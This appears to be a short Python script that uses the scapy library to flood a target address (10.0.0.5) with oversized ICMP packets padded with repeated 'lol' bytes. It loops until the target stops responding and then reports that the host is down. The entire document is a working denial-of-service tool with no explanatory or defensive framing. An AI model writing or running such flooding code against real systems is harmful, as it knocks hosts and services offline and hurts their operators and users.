from scapy.all import *

target_ip = "10.0.0.5"
target_port = 80

ip = IP(dst=target_ip)

icmp = ICMP()
lol = Raw(b"lol"*3400)

packet = ip / icmp / lol

while True:
	send(packet,loop=0,verbose=1)
	print("\n### TESTING REACHABILITY ###\n")
	response = sr1(packet, timeout=3)
	#response.summary()
	if response == None:
		print("\nNO RESPONSE. HOST IS DOWN\n")
		break
